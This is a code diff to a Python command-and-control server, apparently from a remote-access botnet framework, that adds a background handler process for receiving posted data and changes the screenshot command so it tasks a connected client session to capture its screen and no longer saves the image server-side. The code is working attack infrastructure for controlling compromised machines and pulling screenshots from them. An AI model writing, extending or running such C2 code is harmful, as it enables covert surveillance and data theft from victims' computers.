@@ -124,6 +124,7 @@ def main():
     globals()['packages'] = packages[0]
     globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
     globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
+    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, options.port + 3), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
 
     global c2
@@ -337,6 +338,7 @@ class C2():
         """
         globals()['package_handler'].terminate()
         globals()['module_handler'].terminate()
+        globals()['post_handler'].terminate()
         if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
             for session in self.sessions.values():
                 if isinstance(session, Session):
@@ -586,22 +588,16 @@ class C2():
         if not self.current_session:
             return "No client session"
         else:
-            task = {"task": "screenshot", "session": self.current_session.info.get('uid')}
-            self.current_session.send_task(task)
-            output = self.current_session.recv_task()
-            print json.dumps(output)
-            output = output['result']
             if not os.path.isdir('data'):
                 try:
                     os.mkdir('data')
                 except OSError:
                     util.log("Unable to create directory 'data' (permission denied)")
                     return
-            filename = 'data/{}.png'.format(str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]))
-            with file(filename, 'wb') as fp:
-                fp.write(output)
-            return filename
-
+            task = {"task": "screenshot", "session": self.current_session.info.get('uid')}
+            self.current_session.send_task(task)
+            time.sleep(2)
+            return "Screenshot complete"
 
     def session_remove(self, session_id):
         """ 
